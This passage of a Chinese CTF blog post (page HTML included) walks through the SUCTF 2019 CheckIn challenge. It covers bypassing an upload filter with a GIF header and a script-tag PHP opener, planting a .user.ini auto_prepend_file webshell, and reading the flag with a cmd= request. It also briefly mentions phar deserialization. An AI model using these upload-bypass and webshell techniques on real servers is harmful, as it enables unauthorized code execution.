+<p>第二步联想到<code>phar反序列化</code>以及去构造<code>ZipArchive-&gt;open()</code>也有一定难度</p>
+<p>总的来说还是知识面不够宽</p>
+<p>搜索php中某个方法：<a href="https://www.php.net/results.php?q=::open&amp;l=zh&amp;p=all" target="_blank" rel="noopener">https://www.php.net/results.php?q=::open&amp;l=zh&amp;p=all</a></p>
+<p>phar反序列化：<a href="https://xz.aliyun.com/t/6057#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/6057#toc-2</a></p>
+<h2 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h2><blockquote>
+<p>题目来源：SUCTF 2019    考察：.user.ini文件与PHP解析</p>
+</blockquote>
+<h3 id="题解-4"><a href="#题解-4" class="headerlink" title="题解"></a>题解</h3><p>访问主页为一个上传功能的网页，尝试随机上传php文件，提示：<code>illegal suffix!</code></p>
+<p>后缀改为jpg的文件，提示：<code>exif_imagetype:not image!</code></p>
+<p>exif_imagetype()函数主要检测图片开头前几个字节，因此添加<code>GIF89A</code>绕过</p>
+<p>再次提交提醒：<code>&lt;? in contents!</code>，猜测后台不允许文件内容存在&lt;?，但可通过<code>&lt;script language=&#39;php&#39;&gt;&lt;/script&gt;</code>绕过</p>
+<p>从上分析可以总结出：</p>
+<ul>
+<li>不允许上传文件后缀为php</li>
+<li>需要添加文件头绕过exif_imagetype()函数</li>
+<li>文件内容不允许存在&lt;?</li>
+</ul>
+<p>对于不允许php文件，那么可以上传<code>.htaccess</code>文件，但本题中并未成功解析</p>
+<p>但可通过<code>.user.ini</code>来上传php后门</p>
+<blockquote>
+<p>.user.ini类似于.htaccess，但使用范围更广泛，不仅仅支持Apache，还支持Nginx、IIS</p>
+<p>其中auto_prepend_file=shell.bbb    意味着访问与.user.ini文件同目录的php文件，都会包含shell.bbb文件</p>
+</blockquote>
+<img src="//songxpu.github.io/2019/09/28/CTF Web记录(二)/web5_1.jpg" width="800">
+
+<p>再上传一个webshell</p>
+<img src="//songxpu.github.io/2019/09/28/CTF Web记录(二)/web5_2.jpg" width="800">
+
+<p>访问该目录下已存在的index.php文件，成功解析</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uploads/3f8c45add7e4722d7a34d2fea8c87504/index.php?<span class="attribute">cmd</span>=cat <span class="built_in">..</span>/<span class="built_in">..</span>/<span class="built_in">..</span>/flag</span><br></pre></td></tr></table></figure>
+
+<h3 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h3><p>这道题主要考察<code>.user.ini</code>，参考文章：</p>
+<ul>
+<li><p><a href="https://wooyun.js.org/drops/user.ini文件构成的PHP后门.html" target="_blank" rel="noopener">user.ini文件构成的PHP后门</a></p>
+</li>
+<li><p><a href="https://xz.aliyun.com/t/6091#toc-4" target="_blank" rel="noopener">从SUCTF 2019 CheckIn 浅谈.user.ini的利用</a></p>
+</li>
+</ul>
+<p>条件：</p>
+<ul>
+<li>1、服务器脚本语言为PHP</li>
+<li>2、服务器使用CGI／FastCGI模式</li>
+<li>3、上传目录下要有可执行的php文件</li>
+</ul>
+<p>相比于<code>.htaccess</code>文件，适用范围更广，Nginx/Apache/IIS有效</p>
+<p>非常有必要去刷刷乌云知识库</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        
+          
+        
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+            <a href="/tags/web安全/" rel="tag"># web安全</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/09/22/SolidState/" rel="next" title="SolidState渗透实战">
+                <i class="fa fa-chevron-left"></i> SolidState渗透实战
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Azeroth</p>
+              <div class="site-description motion-element" itemprop="description"></div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">15</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">3</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">11</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Chopper"><span class="nav-number">2.</span> <span class="nav-text">Chopper</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#题解"><span class="nav-number">2.1.</span> <span class="nav-text">题解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number">2.2.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHPINFO"><span class="nav-number">3.</span> <span class="nav-text">PHPINFO</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#题解-1"><span class="nav-number">3.1.</span> <span class="nav-text">题解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-1"><span class="nav-number">3.2.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bestphp’s-revenge"><span class="nav-number">4.</span> <span class="nav-text">bestphp’s revenge</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#题解-2"><span class="nav-number">4.1.</span> <span class="nav-text">题解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-2"><span class="nav-number">4.2.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EZCMS"><span class="nav-number">5.</span> <span class="nav-text">EZCMS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#题解-3"><span class="nav-number">5.1.</span> <span class="nav-text">题解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-3"><span class="nav-number">5.2.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CheckIn"><span class="nav-number">6.</span> <span class="nav-text">CheckIn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#题解-4"><span class="nav-number">6.1.</span> <span class="nav-text">题解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-4"><span class="nav-number">6.2.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Azeroth</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">站点总字数：</span>
+    
+    <span title="站点总字数">76k</span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    
+    <span title="站点阅读时长">1:09</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.8.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.1.2</div>
+
+
+
+<span id="busuanzi_container_site_uv">
+  本站访问次数：<span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+</span>
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.2"></script>
+
+  <script src="/js/motion.js?v=7.1.2"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.1.2"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.1.2"></script>
+
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.2"></script>
+<script src="/js/post-details.js?v=7.1.2"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.2"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
